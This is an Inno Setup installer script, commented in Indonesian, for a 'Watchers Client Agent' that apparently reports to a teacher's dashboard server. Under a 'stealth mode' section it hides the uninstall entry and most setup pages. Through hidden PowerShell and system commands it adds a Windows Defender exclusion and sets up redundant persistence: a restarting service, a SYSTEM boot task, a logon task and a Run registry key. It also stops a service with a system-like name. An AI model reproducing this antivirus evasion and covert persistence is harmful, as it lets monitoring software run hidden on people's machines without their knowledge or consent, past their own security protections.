[Setup]
AppName=Watchers Client Agent
AppVersion=1.1.0
AppPublisher=Watchers Security
DefaultDirName={commonappdata}\WatchersAgent
OutputBaseFilename=WatchersAgent_SetupV12
Compression=lzma2/ultra64
SolidCompression=yes
PrivilegesRequired=admin
ArchitecturesInstallIn64BitMode=x64

; ================================================================
; KONFIGURASI TERSEMBUNYI (STEALTH MODE) & PENGUNCIAN PATH
; ================================================================
CreateUninstallRegKey=no
DisableDirPage=yes
DisableProgramGroupPage=yes
DisableWelcomePage=yes
DisableReadyPage=yes
DisableFinishedPage=yes

[Files]
; 1. Agent utama dalam bentuk Single File EXE
Source: "dist\WatchersAgent.exe"; DestDir: "{app}"; Flags: ignoreversion

; 2. File pendukung dari folder tools lokal (nssm.exe dan WatchdogWatchers.exe)
Source: "tools\nssm.exe"; DestDir: "{app}"; Flags: ignoreversion
Source: "tools\WatchdogWatchers.exe"; DestDir: "{app}"; Flags: ignoreversion

; 3. Dependency C++ Redistributable
Source: "vc_redist.x64.exe"; DestDir: "{tmp}"; Flags: deleteafterinstall

[Icons]
; Shortcut untuk Mode Pengaturan Server (--config) di folder instalasi {app}
Name: "{app}\Pengaturan Server Watchers"; Filename: "{app}\WatchersAgent.exe"; Parameters: "--config"; Comment: "Ubah Konfigurasi Server WatchersAgent"

[Run]
; 1. Instalasi VC++ Redistributable jika belum ada
Filename: "{tmp}\vc_redist.x64.exe"; Parameters: "/install /passive /norestart"; Check: not IsVCRedistInstalled; StatusMsg: "Menginstal Microsoft Visual C++..."; Flags: waituntilterminated

; 2. Tambahkan Exclusion Path ke Windows Defender
Filename: "powershell.exe"; Parameters: "-ExecutionPolicy Bypass -NoProfile -Command Add-MpPreference -ExclusionPath '{app}'"; Flags: runhidden

; 3. DAFTARKAN WATCHDOG SEBAGAI WINDOWS SERVICE
Filename: "{app}\nssm.exe"; Parameters: "install WatchersWatchdog ""{app}\WatchdogWatchers.exe"""; Flags: runhidden
Filename: "{app}\nssm.exe"; Parameters: "set WatchersWatchdog DisplayName ""Watchers Watchdog Service"""; Flags: runhidden
Filename: "{app}\nssm.exe"; Parameters: "set WatchersWatchdog Description ""Memastikan WatchersAgent tetap berjalan di background sebelum dan sesudah login."""; Flags: runhidden
Filename: "{app}\nssm.exe"; Parameters: "set WatchersWatchdog Start SERVICE_AUTO_START"; Flags: runhidden
Filename: "{app}\nssm.exe"; Parameters: "set WatchersWatchdog AppExit Default Restart"; Flags: runhidden
Filename: "{app}\nssm.exe"; Parameters: "start WatchersWatchdog"; Flags: runhidden

; 4. DAFTARKAN TASK SCHEDULER SYSTEM BOOT
Filename: "schtasks.exe"; Parameters: "/create /tn ""WatchersAgentSystemTask"" /tr ""'{app}\WatchersAgent.exe'"" /sc onstart /ru ""NT AUTHORITY\SYSTEM"" /rl highest /f"; Flags: runhidden

; 5. DAFTARKAN TASK SCHEDULER USER LOGON
Filename: "schtasks.exe"; Parameters: "/create /tn ""WatchersAgentUserTask"" /tr ""'{app}\WatchersAgent.exe'"" /sc onlogon /rl highest /f"; Flags: runhidden

; 6. Daftarkan ke Windows Startup Registry (Fallback)
Filename: "reg.exe"; Parameters: "add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /v ""WatchersAgentAuto"" /t REG_SZ /d ""\""{app}\WatchersAgent.exe\"""" /f"; Flags: runhidden

; 7. Eksekusi Seketika Setelah Instalasi
Filename: "schtasks.exe"; Parameters: "/run /tn ""WatchersAgentSystemTask"""; Flags: runhidden

[Code]
var
  ConfigPage: TWizardPage;
  ProtocolCombo: TComboBox;
  DomainEdit: TNewEdit;

// ================================================================
// Check VC++ Installed
// ================================================================
function IsVCRedistInstalled: Boolean;
var
  Installed: Cardinal;
begin
  Result := RegQueryDWordValue(HKLM, 'SOFTWARE\Microsoft\VisualStudio\14.0\VC\Runtimes\x64', 'Installed', Installed) and (Installed = 1);
  if not Result then
    Result := RegQueryDWordValue(HKLM, 'SOFTWARE\WOW6432Node\Microsoft\VisualStudio\14.0\VC\Runtimes\x64', 'Installed', Installed) and (Installed = 1);
end;

// ================================================================
// INISIALISASI HALAMAN INPUT SERVER URL
// ================================================================
procedure InitializeWizard();
var
  LblProtocol, LblDomain: TLabel;
begin
  // Buat Halaman Kustom untuk Input Server URL
  ConfigPage := CreateCustomPage(wpWelcome, 'Konfigurasi Server Watchers', 'Masukkan alamat URL atau IP Server Dashboard Guru.');

  // Label Pilih Protokol
  LblProtocol := TLabel.Create(ConfigPage);
  LblProtocol.Parent := ConfigPage.Surface;
  LblProtocol.Caption := 'Pilih Protokol Koneksi:';
  LblProtocol.Left := 0;
  LblProtocol.Top := 8;
  LblProtocol.Font.Style := [fsBold];

  // Dropdown Selection (https:// vs http://)
  ProtocolCombo := TComboBox.Create(ConfigPage);
  ProtocolCombo.Parent := ConfigPage.Surface;
  ProtocolCombo.Style := csDropDownList;
  ProtocolCombo.Items.Add('https://');
  ProtocolCombo.Items.Add('http://');
  ProtocolCombo.ItemIndex := 0; // Default: https://
  ProtocolCombo.Left := 0;
  ProtocolCombo.Top := LblProtocol.Top + LblProtocol.Height + 6;
  ProtocolCombo.Width := 120;

  // Label Input Domain/IP
  LblDomain := TLabel.Create(ConfigPage);
  LblDomain.Parent := ConfigPage.Surface;
  LblDomain.Caption := 'Domain atau IP Server (Contoh: agent.tebaslahandev.my.id atau 192.168.1.100:8000):';
  LblDomain.Left := 0;
  LblDomain.Top := ProtocolCombo.Top + ProtocolCombo.Height + 16;
  LblDomain.Font.Style := [fsBold];

  // Input Box Domain / IP
  DomainEdit := TNewEdit.Create(ConfigPage);
  DomainEdit.Parent := ConfigPage.Surface;
  DomainEdit.Text := 'agent.tebaslahandev.my.id'; // Default value
  DomainEdit.Left := 0;
  DomainEdit.Top := LblDomain.Top + LblDomain.Height + 6;
  DomainEdit.Width := ConfigPage.SurfaceWidth;
end;

// ================================================================
// PENULISAN CONFIG.JSON SETELAH PROSES INSTALL SELESAI
// ================================================================
procedure CurStepChanged(CurStep: TSetupStep);
var
  ProtocolStr, DomainStr, FullUrl, ConfigPath, JsonContent: string;
begin
  if CurStep = ssPostInstall then
  begin
    // Ambil nilai protokol
    if ProtocolCombo.ItemIndex = 1 then
      ProtocolStr := 'http://'
    else
      ProtocolStr := 'https://';

    DomainStr := Trim(DomainEdit.Text);

    // Hapus awalan http:// atau https:// jika pengguna tidak sengaja mengetiknya
    if Pos('http://', DomainStr) = 1 then
      Delete(DomainStr, 1, 7);
    if Pos('https://', DomainStr) = 1 then
      Delete(DomainStr, 1, 8);

    // Gabungkan menjadi Full URL
    FullUrl := ProtocolStr + DomainStr;

    // Lokasi config.json di C:\ProgramData\WatchersAgent\config.json
    ConfigPath := ExpandConstant('{app}\config.json');

    // Format isi JSON
    JsonContent := '{' + #13#10 +
                   '    "SERVER_URL": "' + FullUrl + '",' + #13#10 +
                   '    "RECONNECT_INTERVAL": 3' + #13#10 +
                   '}';

    // Simpan file config.json
    SaveStringToFile(ConfigPath, JsonContent, False);
  end;
end;

// ================================================================
// FUNGSI PEMBERSIHAN UTAMA (SERVICE, TASK, REGISTRY, PROSES)
// ================================================================
procedure StopAndCleanupEverything();
var
  ResultCode: Integer;
begin
  // 1. Hentikan & hapus Service NSSM
  Exec('net.exe', 'stop WatchersWatchdog', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
  Exec('sc.exe', 'delete WatchersWatchdog', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
  Exec('net.exe', 'stop WinSecurityBroker', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
  Exec('sc.exe', 'delete WinSecurityBroker', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);

  // 2. Hapus Task Scheduler (System Boot & User Logon)
  Exec('schtasks.exe', '/delete /tn "WatchersAgentTask" /f', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
  Exec('schtasks.exe', '/delete /tn "WatchersAgentSystemTask" /f', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
  Exec('schtasks.exe', '/delete /tn "WatchersAgentUserTask" /f', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
  Exec('schtasks.exe', '/delete /tn "WatchersWatchdogTask" /f', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);

  // 3. Hapus Auto-Run Registry Windows
  Exec('reg.exe', 'delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WatchersAgentAuto" /f', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);

  // 4. Matikan semua proses aktif
  Exec('taskkill.exe', '/F /T /IM WatchdogWatchers.exe /IM WatchersAgent.exe /IM nssm.exe', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);

  Sleep(1500);
end;

function InitializeSetup(): Boolean;
var
  AppDir: string;
  ResultCode: Integer;
begin
  Result := True;
  StopAndCleanupEverything();

  AppDir := ExpandConstant('{commonappdata}\WatchersAgent');
  if DirExists(AppDir) then
  begin
    Exec('cmd.exe', '/c rmdir /s /q "' + AddQuotes(AppDir) + '"', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
  end;
end;

function InitializeUninstall(): Boolean;
begin
  Result := True;
  StopAndCleanupEverything();
end;

procedure CurUninstallStepChanged(CurUninstallStep: TUninstallStep);
var
  AppDir: string;
  ResultCode: Integer;
begin
  if CurUninstallStep = usPostUninstall then
  begin
    AppDir := ExpandConstant('{commonappdata}\WatchersAgent');
    if DirExists(AppDir) then
    begin
      Exec('cmd.exe', '/c rmdir /s /q "' + AddQuotes(AppDir) + '"', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
    end;
  end;
end;